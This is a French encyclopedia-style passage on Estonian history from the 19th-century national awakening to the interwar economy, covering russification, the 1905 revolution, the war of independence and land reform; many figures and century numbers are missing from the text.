Les estophiles cherchent à reconstituer le passé historique des Estoniens. Soucieux de valoriser leur sujet d'étude et en proie à une exagération caractéristique de cette époque romantique, certains d'entre eux tracent le portrait d'une société estonienne antérieure aux croisades baltes idyllique et raffinée. Ces études les mènent à s'intéresser à la Finlande qui utilise une langue apparentée, ce qui, dans l'optique herdérienne dominante, font des Finlandais et des Estoniens des peuples frères. La deuxième moitié du en Europe a vu la publication de plusieurs récits mythologiques, censés être l'expression du génie de la Nation à l'imitation des œuvres d'Homère pour la Grèce et de l’"Énéide" pour Rome. Dans cette veine paraît en 1789 en Finlande la "Mythologia Fennica" œuvre de Christfried Ganander qu'un jeune poète estonien décédé prématurément, Kristjan Jaak Peterson (1801-1822), traduit du suédois en allemand. Ce texte, mais plus encore "Kalevala", un recueil de légendes finlandaises arrangées par Elias Lönnrot et publié en 1835, vont servir de source d'inspiration pour Friedrich Robert Faehlmann. Ce pur Estonien, médecin de profession, est un des fondateurs de la Société savante estonienne. Il publie en allemand dans les années 1840 huit récits mythologiques qu'il dit inspirés de légendes recueillies dans les campagnes estoniennes mais qui sont, en fait, en partie empruntés à des œuvres étrangères et en partie le fruit de sa création. Il esquisse la rédaction d'une épopée estonienne centrée sur le géant Kalevipoeg, personnage de nombreux contes estoniens, mais décède sans avoir pu mener à bien sa rédaction. Son ami Friedrich Reinhold Kreutzwald, également médecin et estonien, reprend le flambeau. S'inspirant du panthéon mis en place par Faehlman, il rédige un poème monumental de vers intitulé "Kalevipoeg" qui sera publié entre 1857 et 1861 en allemand et en estonien. Dès la génération suivante, l'ouvrage acquiert le statut d'épopée nationale. Si l'ouvrage n'est aujourd'hui plus vraiment lu, ses thèmes et ses personnages sont connus de tous les Estoniens.
À compter de 1830, les Estoniens, qui n'ont plus honte de leurs racines, prennent le relais des estophiles et se revendiquent comme estoniens ("eeslane") un terme qui n'apparaît qu'à cette époque. Jusque-là les Estoniens se désignaient sous le nom de "maarahvas" (« les gens du pays ») et appelaient leur langue "maakeel" (« la langue du pays »). Mais l'allemand reste toujours la langue de la culture, dont la maîtrise est nécessaire à toute élévation sociale. L'estonien est encore à cette époque une langue rustique à laquelle il manque une grammaire et un vocabulaire permettant de manier des concepts abstraits. Les membres de la petite communauté intellectuelle estonienne vont forger au cours de la deuxième moitié du l'estonien moderne à l'aide de différentes méthodes : plusieurs milliers de termes sont créés à cette époque par néologisme, emprunts à d'autres langues ou au patois, etc. Des dictionnaires rédigés au début du contribueront à figer et à donner leur cohérence à ces travaux. La graphie de l'estonien, très influencée jusque-là par l'allemand, est remaniée pour reproduire de manière plus fidèle la prononciation ; elle est rapprochée de celle du finlandais ; ainsi le ö inspiré de l'allemand est désormais retranscrit en õ à la manière finlandaise. Une presse en estonien commence à apparaître grâce à l'activité des estophiles. Dans la première moitié du siècle, ce ne sont que des journaux éphémères aux tirages très faibles. Le premier véritable journal est le "Perno Postimees" ("le postillon de Përnu") édité par Johann Voldemar Jannsen de 1857 à 1864 qui compte abonnés.
L'économie estonienne à la fin du.
À la fin du , le territoire qui correspond à l'Estonie moderne compte dont 3,9 % se déclarent russes et 3,5 % allemands. Alors que les campagnes sont désormais relativement surpeuplées, l'émigration vers d'autres pays, bien qu'elle soit officiellement autorisée depuis 1863, est limitée à la Russie où l'on compte à cette époque Estoniens concentrés dans les régions voisines. Le Zemstvo, assemblée locale élue au suffrage censitaire institué en 1865 par Alexandre II, est mis en place dans les pays baltes à partir de 1870 et permet pour la première fois aux Estoniens de jouer un rôle actif dans la vie politique locale des villes. Un système similaire est créé à l'échelon du vallad dans les campagnes. Les réformes d'Alexandre II touchent également les relations entre les gros propriétaires fonciers et les paysans : l'oukase de 1866 interdit les châtiments corporels, impose le paiement des fermages en argent et limite le pouvoir du mõisnik dans l'assemblée locale. Ces gros propriétaires fonciers, confrontés à des difficultés financières croissantes, vendent progressivement les terres qu'ils n'exploitent pas directement et en 1900 les fermiers de Livonie sont propriétaires de 86 % des terres qu'ils cultivent au prix toutefois d'un fort endettement. Il existe même quelques mõisnik de souche estonienne ; le premier apparaît en Livonie en 1867. La classe des petits et moyens propriétaires et fermiers estoniens constitue désormais le cœur d'une population rurale instruite (97 % des Estoniens savent lire et 78 % lire et écrire). Les deux tiers des agriculteurs estoniens sont de simples ouvriers agricoles. Les pratiques agricoles évoluent rapidement avec la généralisation des engrais. Mouvements coopératifs et systèmes de financement s'amorcent au tournant du siècle. Les céréales, dont la culture est devenue moins rentable face à la concurrence désormais ouverte des grandes régions céréalières du monde, sont remplacées par la pomme de terre, qui devient la base de l'alimentation des paysans estoniens, la culture du lin et l'élevage de vaches, qui fournit en produits laitiers la capitale russe.
La population des villes s'est fortement accrue au cours des dernières décennies - Tallinn compte - et les germanophones y sont désormais très minoritaires. L'industrie commence à occuper une place notable ( en 1900 essentiellement à Narva et à Tallinn) grâce à la proximité de la mer Baltique et de la capitale de l'Empire russe. Les productions principales sont le textile, les produits métallurgiques, les machines-outils et le papier ; pour ce dernier produit la région fournit 70 % de la consommation de l'Empire russe. Les capitaux utilisés sont majoritairement d'origine étrangère. La première ligne de chemin de fer est construite en 1870 et relie Tallinn, Narva et Saint-Pétersbourg. L'activité portuaire de Tallinn se développe mais est dépassée par celle de Riga qui, grâce à situation sur le fleuve Daugava, draine le trafic commercial d'une partie de la Russie d'Europe.
La tentative de russification (1885-1904).
En 1871 la renaissance d'un empire allemand au nationalisme agressif contribue à modifier le regard que portent les dirigeants russes sur les États baltes. Les Germano-baltes ne sont pas insensibles à la naissance d'une nation allemande moderne et forte. Par ailleurs la révolte polono-lituanienne de 1863 entraîne un regain de méfiance du tsar vis-à-vis des peuples de l'Empire situés sur les marges occidentales de la Russie. Le courant de pensée panslaviste, réponse au pangermanisme allemand, se développe en Russie : au sein de l'empire certains souhaitent renforcer l'identité russe des régions peuplées de non russes. Mais cette idéologie, qui prône la naissance d'un État-nation russe est difficilement applicable à un empire qui compte 57 % de non-russes (en 1897). Elle a, de ce fait, peu d'influence sur la politique des tsars. Mais après l'assassinat d'Alexandre II en 1881, qui marque un coup d'arrêt brutal à une période de réformes, Alexandre III adopte en partie les thèses des panslavistes. Il refuse notamment de reconduire les privilèges des Germano-baltes et donne comme instruction aux nouveaux gouverneurs des provinces baltes de renforcer la présence de l'État russe. Le russe devient la langue de l'administration et de la justice. Les fonctionnaires russophones remplacent les germanophones. Le pouvoir tente d'encourager sans succès les conversions à la religion orthodoxe et fait construire des églises orthodoxes comme la cathédrale Alexandre Nevski, située à deux pas du siège de la diète d'Estonie et inaugurée en 1900. Les écoles primaires passent en 1885 sous l'autorité du ministère de l'Éducation. Le russe devient progressivement la langue obligatoire sur l'ensemble du cursus scolaire. Des enseignants russophones remplacent les maîtres d'école ne maîtrisant pas suffisamment le russe pour enseigner dans cette langue. À l'université de Tartu (la ville est rebaptisée Iouriev, son nom russe d'origine), la plupart des enseignants, qui étaient jusque-là des germanophones, sont remplacés par des russophones. Les Germano-baltes sont ainsi pratiquement exclus de tous les domaines dans lesquels ils occupaient une position dominante depuis des siècles. Pour les Estoniens la politique de russification va, de manière paradoxale, renforcer à la fois le sentiment national et la position de la langue estonienne. Le russe est appris comme une langue utilitaire car il n'a pas le prestige de l'allemand. Ce dernier, qui était la langue de la culture chez les Estoniens les plus instruits, perd sa position dominante. Entre 1890 et 1900 l'estonien devient la langue des Estoniens cultivés.
C'est sans doute également à cette époque que le sentiment national se répand chez une majorité d'Estoniens. Signe de cette vitalité du nationalisme estonien, le nombre d'associations qui se déclarent estoniennes s'accroît. Parmi celles-ci la Société des étudiants estoniens, fondée en 1870 mais reconnue par le recteur de l'université de Tartu en 1883 seulement, milite pour que l'estonien devienne la langue en usage dans les milieux intellectuels. Elle adopte, sur la suggestion de Jakob Hurt, un drapeau comportant trois bandes de couleurs bleue, noire et blanche disposées horizontalement, qui va devenir rapidement celui du mouvement national avant d'être adopté par l'Estonie indépendante. Après le décès d'Alexandre III en 1894, l'autoritarisme du pouvoir russe s'atténue et le mouvement national estonien peut se politiser. Les leaders du mouvement ne demandent pas l'indépendance, qu'ils n'envisagent pas, mais la reconnaissance de leur existence en tant que peuple et l'égalité des droits avec les Germano-baltes. L'une des figures les plus en vue est Jaan Tõnisson. Ce juriste, ancien président de l'association des étudiants estoniens, prend la direction du principal journal estonien, le "Postimees", en 1896 : il milite pour la reconnaissance du peuple estonien dans le respect de la loi avec pragmatisme, c'est-à-dire au besoin en s'alliant aux Germano-baltes. Conservateur, il considère, comme de nombreux politiciens estoniens du , que l'identité de la nation estonienne se trouve dans ses racines rurales. L'avocat Konstantin Päts, future figure politique majeure de l'Estonie indépendante, fonde à Tallinn le deuxième quotidien estonien "Teataja (Le Héraut)". Plus radical, il souhaite écarter les Germano-baltes du pouvoir et, sans adhérer aux thèses socialistes, s'intéresse au sort des couches les plus défavorisées de la population urbaine. Aux élections municipales de 1904, les nationalistes estoniens présentent pour la première fois des candidats. Päts, allié à un parti russophone, remporte les élections à Tallinn et devient maire-adjoint de cette ville. Il existe quelques défenseurs estoniens de la russification qui mettent en avant notamment la faiblesse démographique des Estoniens. Un mouvement socialiste clandestin apparaît à l'université de Tartu dans les années 1890 tandis qu'une cellule du Parti social-démocrate russe (S.D.), dont les membres sont majoritairement estoniens, est créée dès 1902 à Tallinn.
La Révolution de 1905.
La Révolution russe de 1905 éclate à la suite de la défaite de l'Empire face au Japon dans un contexte de crise économique et sociale. Son déclenchement (dimanche rouge de Saint-Pétersbourg) est suivi de mouvements de grèves et de manifestations sur le territoire de l'Estonie analogues à ce qui se passe au même moment dans le reste de l'empire. Les représentants des courants nationalistes estoniens, sur le devant de la scène en l'absence de partis ou de syndicats, demandent des représentants élus au suffrage universel, une réforme agraire et une reconnaissance de la langue estonienne, mais à l'époque, l'idée d'indépendance, qui paraît irréaliste aux acteurs, n'est pas évoquée. Le 16 octobre, alors que l'anarchie s'est installée à Tallinn, l'armée ouvre le feu dans cette ville sur un rassemblement autorisé et fait entre 28 et . Quelques jours plus tard, Nicolas II tente de calmer les esprits en promettant d'organiser sur le territoire de l'Empire russe des élections au suffrage universel et d'autoriser les partis politiques ainsi que les syndicats. Durant les suivants, le gouvernement russe abandonne la politique de répression et de censure. Jaan Tõnisson fonde le Parti progressiste populaire ("Eesti Rahvameelne Eduerakond" ou ERE), premier parti politique estonien : celui-ci réclame l'établissement d'une monarchie russe parlementaire, l'autonomie politique de la région, et des droits accrus pour les paysans. Au même moment apparaît un parti socialiste marxiste, l'Union des travailleurs sociaux-démocrates d'Estonie, bien implanté dans les villes, tandis que les Germano-baltes fondent à Riga le Parti constitutionnel balte, d'idéologie progressiste mais reposant sur la prééminence de la culture allemande et de l'élite germanophone. Fin novembre, 800 délégués de l'ERE réunis à Tartu se divisent entre deux mouvements prônant des programmes opposés : les modérés demandent l'union des provinces baltes, la limitation du pouvoir des Germano-baltes et une réforme agraire progressive, tandis que les radicaux exigent l'expropriation des propriétaires fonciers, la collectivisation des terres et appellent à boycotter l'impôt et la conscription militaire.
Nicolas II décide de remettre de l'ordre dans l'empire. Dans les pays baltes la loi martiale est instaurée fin décembre 1905 et des arrestations sont opérées dans les milieux nationalistes et socialistes. Dans tout l'empire cette reprise en main attise les violences révolutionnaires. En Estonie les ouvriers de Tallinn s'en prennent aux grandes propriétés foncières. Près de 160 d'entre elles, sur les que compte le territoire, sont gravement endommagées, parfois brûlées. Des troupes militaires, aidées dans certains cas par les milices formées par les propriétaires fonciers, rétablissent l'ordre de manière particulièrement brutale : il y a plus de 300 exécutions sommaires en Estonie et Livonie, 686 condamnations à mort dont 200 sont appliquées. De nombreux dirigeants nationalistes ou socialistes, dont Päts, sont obligés de s'exiler quand ils ne sont pas emprisonnés ou déportés en Sibérie. Les partis et les syndicats sont interdits, sauf l'aile modérée de l'ERE et du Parti Constitutionnel balte. Les journaux sont interdits de parution. En avril 1906 ont lieu les premières élections à la Douma russe. L'Estonie envoie cinq députés dont Jaan Tõnisson et un russe.
La majorité de la Douma s'accorde sur un programme que le tsar ne veut pas appliquer et l'assemblée est dissoute en juillet. Tõnisson fait trois mois de prison pour avoir protesté contre la dissolution. L'Estonie envoie cinq députés aux programmes plus radicaux, dont deux sociaux-démocrates à la deuxième douma (janvier 1907), qui est rapidement dissoute pour les mêmes raisons que la première. Pour obtenir une assemblée conforme à ses vues, Nicolas II modifie la loi électorale : dans les deux doumas suivantes (1907 et 1912) les Estoniens n'ont plus que deux représentants tandis que trois députés représentent les Germano-baltes de l'ensemble des pays baltes. Un Conseil Spécial chargé de mettre en place les réformes dans la région ne parvient pas à ses fins, car les Germano-baltes s'opposent à toute modification du "statu quo". Par contre, les élections municipales permettent aux Estoniens de s'emparer de plusieurs municipalités détenues jusque-là par des germanophones.
La Révolution de 1905 contribue à radicaliser les positions politiques. Chez les sociaux-démocrates apparaît une scission entre d'une part les mencheviks et d'autre part les bolcheviks de Lénine hostiles au courant nationaliste ; ces derniers recrutent en Estonie parmi les ouvriers russophones et des ouvriers estoniens radicalisés tel que Jaan Anvelt. Les Germano-baltes, en réaction à cette montée du nationalisme, font venir depuis la Russie colons germanophones qui s'installent essentiellement autour de Riga (moins de 500 en Estonie). Les relations entre les communautés germanophone et estonienne se tendent fortement. Malgré la crise politique de 1905, l'économie continue de prospérer et la population continue de s'accroître. Elle atteint en 1911 soit une augmentation de 17 % par rapport à 1897. Par ailleurs Estoniens sont installés dans les autres provinces de l'Empire dont 50 % dans l'agglomération des Saint-Pétersbourg. La proportion des non-Estoniens reste stable à environ 10 % malgré l'existence d'un flux migratoire en provenance de la Russie. La population citadine représente désormais environ 20 % du total. Tallinn, en particulier, double de taille entre 1897 et 1913, atteignant à la fin de la période : les établissements de l'industrie lourde, en forte croissance, sont en grande partie situés dans cette ville qui est également, à partir de 1912, le port d'attache de la flotte russe de la Baltique. Une classe ouvrière forte de se forme essentiellement à Tallinn (41 % des emplois) et Narva (33 %). Les fermiers estoniens, en rachetant leurs tenures, détiennent désormais une proportion plus importante de terres que les grands propriétaires fonciers (58 %) mais la proportion des paysans sans terre s'accroît. Le mouvement coopératif connaît une forte croissance. Les Estoniens sont de plus en plus nombreux dans les professions libérales et intellectuelles : dans les années 1910 ils représentent un quart des médecins et une proportion encore plus forte de vétérinaires et d'ingénieurs. En revanche, dans l'enseignement supérieur, ce sont les russophones qui remplacent les germanophones. Les membres du clergé généralement nommés par les principaux propriétaires fonciers restent en majorité germanophones, ce qui explique sans doute la déchristianisation particulièrement forte de ce pays au cours du .
De la Première Guerre mondiale à l'indépendance (1914-1920).
La Première Guerre mondiale.
L'entrée en guerre de l'Empire russe contre l'Empire allemand en août 1914 reçoit un accueil plutôt favorable dans les milieux nationalistes estoniens qui y voient le moyen de prendre une revanche sur les « oppresseurs germaniques ». Pour la minorité germano-balte c'est au contraire une catastrophe : les entreprises à capitaux allemands sont nationalisées, les établissements scolaires, les périodiques et les associations germano-baltes sont fermés. Pendant les trois ans que dure le conflit, l'Estonie, comme tous les autres pays belligérants, est profondément touchée par le conflit : Estoniens sont mobilisés soit 20 % de la population mâle dont plus de sont tués et environ . L'économie, privée d'une grande partie de sa main-d'œuvre, est désorganisée alors que l'inflation n'est plus contrôlée. Le commerce sur la mer Baltique est interrompu par le blocus de la marine allemande. En 1916 la tension monte dans la société : les villes, encombrées de réfugiés et de déserteurs, connaissent des problèmes d'approvisionnement, tandis que les grèves, qui se multiplient, atteignent le même niveau qu'en 1906.
La Révolution russe.
L'effondrement du régime tsariste en quelques jours, en février 1917, surprend tous les acteurs. La révolution qui s'ensuit est, au début, en Estonie comme dans le reste de l'Empire russe, peu violente car les forces de l'ordre refusent de défendre le régime. En Estonie, des soviets, composés essentiellement de militants socialistes recrutés parmi les ouvriers et les soldats, sont créés à Tallinn et Narva. Les russophones y sont majoritaires. Le pouvoir officiel coexiste avec ces deux instances sans coordination. Les nationalistes estoniens mobilisent l'opinion régionale et, à l'issue d'une manifestation qui rassemble devant le palais du gouvernement russe à Saint-Pétersbourg, obtiennent du gouvernement provisoire du prince Lvov un nouveau découpage des frontières des pays baltes. Une entité administrative baptisée Estonie est créée ; ses frontières coïncident avec celles de l'Estonie moderne (à l'exception de Narva). L'estonien devient la langue d'enseignement dans les établissements scolaires, les diètes sont abolies. Les fonctionnaires russophones sont renvoyés et le gouvernement russe autorise la formation d'un régiment estonien de en espérant que les soldats auront ainsi plus à cœur de défendre leur territoire contre les Allemands. Le maire de Tallinn, l'Estonien Janna Poska, est nommé commissaire du gouvernement de l'Estonie à titre provisoire en attendant l'élection d'une assemblée provinciale. Les élections ont lieu en mai dans les campagnes et en août et septembre dans les villes. La nouvelle Diète comprend dont cinq bolcheviks, neuf mencheviks, huit S.R., sept représentants du Parti démocrate estonien, un représentant de la minorité germanophone et un autre de la minorité suédophone. Deux nouveaux partis apparaissent à l'occasion de cette élection : le parti agrarien auquel adhère Päts qui n'a pu fonder son propre parti comme il le souhaitait et le parti travailliste estonien. Dans les villes, à Tallinn et encore plus à Narva, les partis bolcheviques et S.R. sont majoritaires car ils peuvent s'appuyer sur une forte minorité russophone et des soldats sensibles à la propagande bolchevique qui réclame un arrêt immédiat des combats. Le parti bolchevique, qui comptait en mars, en compte en octobre. Fin septembre, les Allemands repassent à l'offensive en occupant l'île de Saaremaa alors qu'en Estonie l'anarchie s'installe.
À Petrograd, le gouvernement provisoire russe, qui tarde à mener à bien les réformes attendues et veut poursuivre la guerre avec l'Allemagne, perd tout soutien populaire. Lénine parvient à prendre le pouvoir à Saint-Pétersbourg en profitant de la faiblesse de l'opposition au cours de la révolution d'Octobre et décide de négocier immédiatement la paix avec l'Allemagne. Un armistice est signé en décembre tandis que l'armée russe se débande : les soldats veulent rentrer chez eux et massacrent dans certains cas leurs officiers. Le 27 octobre, soit après la révolution d'Octobre, un comité militaire révolutionnaire d'Estonie, dirigé par le Russe Ivan Rabrchinski et l'Estonien Viktor Kingissepp, chasse le commissaire du gouvernement estonien Poska et prend le pouvoir au nom du nouveau régime. Mais les représentants politiques estoniens résistent : la Diète refuse sa dissolution et se proclame seul organe officiel du pouvoir en Estonie au cours de l'unique session qu'elle tiendra, les fonctionnaires se mettent en grève tandis que le conseil municipal de Tallinn parvient à repousser sa dissolution jusqu'en janvier. Les élections constituantes qui devaient avoir lieu sur l'ensemble du territoire de l'Empire russe sont maintenues par les bolcheviks. En Estonie, ceux-ci ont su séduire la population grâce aux promesses de paix, d'autodétermination des peuples et de réforme agraire. Ils obtiennent 40 % des voix contre 24 % sur l'ensemble du territoire russe. Le Bloc démocratique de Tönisson obtient 23 % des voix et le Parti travailliste 22 %. Fort de ce succès local, les bolcheviks décident de lancer un deuxième scrutin pour élire une assemblée constituante estonienne. Mais le vote, qui débute les 21 et 22 janvier, s'annonce beaucoup moins favorable pour les bolcheviks et ceux-ci décident de l'interrompre sous prétexte d'un complot des Germano-Baltes et des nationalistes et proclament l'état de guerre. Début janvier, l'assemblée constituante panrusse, où les bolcheviks sont minoritaires, avait été dissoute par ces derniers. Le comité des Anciens, émanation de la Diète estonienne, décide début décembre de mobiliser un embryon d'armée nationale. L'idée de l'indépendance commence à prendre corps au sein des hommes politiques estoniens, qui hormis les bolcheviks, n'attendent rien de positif de l'évolution en cours en Russie. Des représentants de la Diète proposent de former une fédération avec les pays scandinaves qui repoussent cette idée. Des contacts sont pris avec les puissances occidentales pour sonder l'opinion de leurs responsables politiques.
Les menaces se précisent au sein de l'Estonie où les bolcheviks commettent des actes de violence contre les prêtres, pratiquent des nationalisations et des confiscations arbitraires et déportent 550 Germano-baltes coupables, selon eux, de trahison. Les négociations entamées en novembre 1917 entre le gouvernement russe et l'Allemagne pour la signature du traité de Brest-Litovsk piétinent, Trotski tente de temporiser car les conditions imposées par l'Allemagne sont particulièrement dures. Le commandement allemand fait alors avancer ses troupes : à partir du 18 février 1918, au cours de l'opération Faustschlag (en allemand : « Coup de poing »), l'armée allemande occupe l'ensemble de la Livonie, puis le nord du pays, sans que les forces russes désorganisées puisent s'y opposer. Durant la brève vacance du pouvoir qui sépare le départ des bolcheviks de l'arrivée des Allemands, le Comité de salut public qui a été désigné le 19 février par le Comité des Anciens pour diriger le pays et qui est composé de trois membres dont Päts et Vilms, proclame symboliquement l'indépendance de l'Estonie dans ses frontières historiques et ethnographiques. L'armée allemande achève l'occupation du pays le 3 mars. Le même jour, sous la pression de Lénine, lucide sur les capacités de l'armée russe, le traité de Brest-Litovsk est signé en mars 1918 : la Russie doit céder plus d'un quart de son territoire, notamment l'Ukraine, la Pologne, la Finlande et la Lituanie ; en ce qui concerne le territoire estonien les habitants de la Livonie et de l'Estonie doivent être rattachés à la Russie tandis que les territoires situés plus au sud, notamment Riga, sont cédés aux Allemands. Mais les partisans d'un État balte unifié sous la tutelle allemande sur le territoire du Baltikum, parviennent à convaincre Berlin de renégocier le traité ; en août les délégués russes acceptent, dans le cadre d'une clause additionnelle, de renoncer à leur souveraineté sur l'ensemble des provinces baltes.
La guerre d'indépendance (1918-1920).
L'occupation allemande de l'Estonie va durer jusqu'à la défaite de l'Empire allemand en novembre 1918. Les Germano-Baltes reprennent les commandes de la région sous la tutelle des autorités militaires allemandes et annulent toutes les mesures prises en faveur des Estoniens depuis le début de la révolution. Environ bolcheviks et nationalistes estoniens sont exécutés, dont sans doute Vilms. Le pays est pillé par le nouvel occupant qui manque de tout. Le système éducatif est germanisé et l'enseignement dans l'université de Tartu, qui a été rouverte, se fait désormais de nouveau en allemand. Les dirigeants germanophones mettent sur pied en avril un Conseil National ("Landesrat") représentant les trois provinces baltes, qui est notamment composé de 35 élus germano-baltes (pour les trois régions) et de treize élus estoniens. Le Conseil propose à l'empereur Guillaume II d'Allemagne de créer un grand-duché balte sur le territoire du Baltikum. Les dirigeants allemands, qui ont pris d'autres engagements dans le cadre du traité de paix avec la Russie et qui ont une confiance limitée dans les dirigeants locaux, ne donnent leur accord qu'en septembre après avoir renégocié la cession de l'ensemble des Pays baltes par les Russes : la création du Duché balte uni est proclamée en novembre alors même que l'Empire allemand s'effondre. Durant cette période, les dirigeants estoniens, qui sont passés dans la clandestinité, ont pris contact avec les dirigeants de l'Italie, la France et le Royaume-Uni, qui acceptent de reconnaître le principe d'une indépendance de l'Estonie. Le 11 novembre, alors que les Allemands vaincus sur le front occidental déposent les armes, le gouvernement provisoire estonien sort de la clandestinité et Päts, qui a été libéré, en prend la tête. Le 21 novembre les occupants allemands lui remettent officiellement le pouvoir alors que le régime impérial allemand s'effondre dans la révolution allemande de 1918-1919.
Les dirigeants bolcheviques tentent de profiter de la nouvelle situation et dénoncent le 13 novembre le traité de Brest-Litovsk. Mi-novembre, un Comité révolutionnaire provisoire d'Estonie se proclame seul pouvoir légal en Estonie et demande à l'Armée rouge de libérer le pays. Les soldats russes passent à l'attaque le 22 novembre dans la région de Narva mais sont repoussés par les armées allemandes qui n'ont pas encore quitté le territoire. Une nouvelle attaque le 28 novembre permet la prise de Narva et, début janvier, l'Armée rouge occupe bientôt tout l'Est de l'Estonie.
Le gouvernement provisoire tente de mobiliser sans grand succès les Estoniens et fait appel à l'aide de la Finlande et de la Grande-Bretagne. Kingissepp organise un soulèvement pro-bolchevique à Tallinn qui échoue. Une armée estonienne est finalement mise sur pied avec, à sa tête, le lieutenant-colonel Johan Laidoner, ancien officier de l'armée russe. Celui-ci reprend l'offensive à la tête d'une division estonienne assistée de volontaires plus ou moins bien organisés. La contre-offensive se déroule le long des voies ferroviaires et est appuyée par des trains blindés. L'armée estonienne reprend d'abord le contrôle de l'axe Tallinn-Narva avec l'appui de commandos débarqués sur la côte, qui sèment la panique sur les arrières de l'ennemi. Puis l'armée estonienne se tourne vers le sud et progresse le long de la voie ferroviaire qui conduit à Riga. La jeune armée a le dessus au cours de deux accrochages à Võru et Valga. Une escadre britannique fait escale à Tallinn en décembre 1918 pour repousser toute tentative d'attaque soviétique par la mer et apporter des munitions et des armes, tandis que la Finlande envoie du matériel et consent un prêt. Des volontaires lettons et scandinaves viennent prêter main-forte à l'armée estonienne. Le février, cette coalition est parvenue à repousser l'Armée rouge en dehors du territoire estonien.
En février 1919, l'Armée rouge reprend l'offensive dans le Sud-Est. En mai, les Estoniens parviennent à repousser celle-ci en territoire russe où elle reçoit le soutien de l'armée des Russes blancs de Nikolaï Ioudenitch. Mais l'entente entre les dirigeants des deux armées n'est pas parfaite car Ioudenitch, qui lutte pour rétablir l'Empire russe, est hostile à l'indépendance de l'Estonie. Une offensive conjointe contre Petrograd, soutenue par les alliés, échoue et l'armée estonienne réintègre ses frontières. Au sud, l'armée estonienne doit se battre contre les corps-francs allemands et la milice ("Landswehr") composée de Germano-baltes commandés par le général allemand Rüdiger von der Goltz : ces armées, qui ont pris le pouvoir en Lettonie et tentent de reconstituer un État germanique avec l'appui officieux des dirigeants allemands, luttent à la fois contre l'Armée Rouge et les nationalistes baltes. Les Estoniens, assistés d'un bataillon letton ( en tout), défont les Allemands le 23 juin 1919 au cours de la bataille de Wenden. Cette victoire sur l'ennemi séculaire sera par la suite célébrée comme une fête nationale. En septembre 1919, l'Estonie engage des pourparlers de paix avec la Russie, mais la désapprobation des puissances occidentales et de leurs alliés baltes et scandinaves, qui espèrent restaurer l'Empire russe et ne veulent pas d'une reconnaissance implicite du régime bolchevique, fait échouer les négociations. L'Armée rouge repasse à l'attaque à Narva avec des effectifs renforcés, et d'artillerie, et l'armée estonienne la repousse avec difficulté. Les négociations reprennent en décembre 1919 et, après d'âpres discussions, les Estoniens signent avec les Soviétiques le traité de Tartu le 2 février 1920. Par celui-ci, la Russie soviétique reconnaît l'indépendance de l'Estonie. La nouvelle frontière ajoute au territoire estonien une bande de terrain située sur la rive droite du fleuve Narva ainsi que l'ensemble du pays setu au sud-est, soit environ 5 % de la superficie totale de l'Estonie. Les Russes d'origine estonienne, dont le nombre est estimé à , sont autorisés à rentrer en Estonie : seule la moitié de ceux qui présenteront des demandes, soit , parviendront à revenir. La plupart des batailles qui opposaient souvent des Estoniens entre eux mobilisaient des effectifs peu nombreux (quelques centaines d'hommes), ce qui explique la modicité des pertes estoniennes finales, environ .
La première période d'indépendance (1920-1939).
Les institutions de l'Estonie.
Les premières élections de l'Estonie indépendante ont lieu en avril 1919 dès que l'Armée rouge a été repoussée en dehors du territoire national. L'assemblée constituante comprend une majorité de socialistes réformistes ( sur 120) élus grâce à un programme proposant une réforme agraire et promettant des emplois aux anciens combattants. Le parti du Premier ministre par intérim Päts n'obtient que . L'assemblée met un an à définir la constitution du nouveau pays. Elle opte pour le régime parlementaire le plus proche des principes démocratiques, qui se révélera en pratique mal adapté aux temps de crise qui suivront et à l'immaturité politique de ce pays neuf. Le pouvoir législatif est représenté par une chambre unique de élus pour trois ans au scrutin proportionnel. Le chef du gouvernement fait également office de chef d'État ; il peut être révoqué à tout moment par les députés et n'a pas de droit de veto sur les décisions législatives. Les citoyens disposent de droits étendus dont ceux de pouvoir initier des référendums populaires à condition de recueillir suffisamment de signatures. Une loi votée dès octobre 1919 confisque les terres de pratiquement tous les mõisads terriens qui subsistaient à l'époque ainsi que les domaines de la Couronne et des Églises, soit en tout 55 % des terres arables de l'Estonie. Celles-ci sont par la suite redistribuées ou vendues aux paysans estoniens. En 1925 un statut légal très ouvert est accordé aux minorités suédoise, allemande, russe et juive.
L'économie.
Dès 1918 le pays se dote d'une monnaie, le mark. Mais les dettes contractées durant la guerre d'indépendance, l'absence de réserve monétaire et une politique de relance économique dispendieuse ont raison de cette devise qui est remplacée en 1927 par la couronne. La taille du marché intérieur de la Russie avait permis d'édifier de grands établissements industriels sur le territoire estonien mais ceux-ci disparaissent après l'indépendance. La mégapole de Saint-Pétersbourg constituait un débouché naturel pour les produits agricoles de la région mais la politique isolationniste du régime soviétique entraîne la rupture des liens économiques très forts qui existaient autrefois : l'URSS n'absorbe entre les deux guerres qu'une très faible partie du commerce extérieur estonien sauf durant une brève embellie liée à la politique de la NEP en 1921-1922. L'Estonie est pratiquement dépourvue de ressources naturelles et son marché intérieur est étroit. Elle peut difficilement trouver de nouveaux débouchés extérieurs à cette époque caractérisée par la montée du protectionnisme dans les pays occidentaux. Aussi ses dirigeants choisissent de développer l'agriculture en accord avec le credo faisant des Estoniens des paysans.
Les agriculteurs, qui représentent 67 % des actifs, sont alors majoritairement propriétaires de leur exploitation (83 % contre 40 % avant l'indépendance) et sont fortement motivés par les changements intervenus dans leur condition. Le nombre d'exploitations a bondi à la suite de la redistribution des terres de à et de nombreuses zones restées jusque-là en friche sont mises en culture. Le développement agricole est facilité par la création d'une banque dédiée au financement des exploitations et le développement d'un mouvement coopératif qui regroupe les deux tiers des agriculteurs dès 1928. Mais la taille réduite des exploitations, la faible viabilité des nouvelles terres mises en culture, l'absence de mécanisation et des infrastructures déficientes débouchent globalement sur un échec économique, même si l'agriculture estonienne réussit à se trouver des débouchés sur les marchés allemand et anglais. De son côté, l'industrie n'emploie plus que au lendemain de l'indépendance et connaît par la suite une croissance lente. La tourbe et les schistes bitumineux, jusque-là dédaignés, sont mis en exploitation, ce qui permet de limiter les importations de charbon. À côté de l'industrie agro-alimentaire, le secteur des sous-produits du bois se développe.
L'Estonie introduit la journée travaillée de dès 1918 et des congés payés pour les ouvriers en 1934. Les conventions collectives se généralisent à partir de 1929. L'assurance maladie devient progressivement obligatoire. L'Estonie est, comme les autres pays européens, fortement touchée par la Grande Dépression qui se traduit dès 1930 par l'effondrement de ses exportations. La couronne est dévaluée en 1933 de 35 %. Le chômage atteint des valeurs inquiétantes tandis que le niveau de vie de l'Estonien subit une forte baisse. Toutefois, dans la seconde moitié des années 1930, l'économie du pays bénéficie de la reprise économique chez ses principaux partenaires et d'un climat politique apaisé par la mise en place d'un régime fort. Le bilan économique à la veille de la Seconde Guerre mondiale est finalement relativement bon.
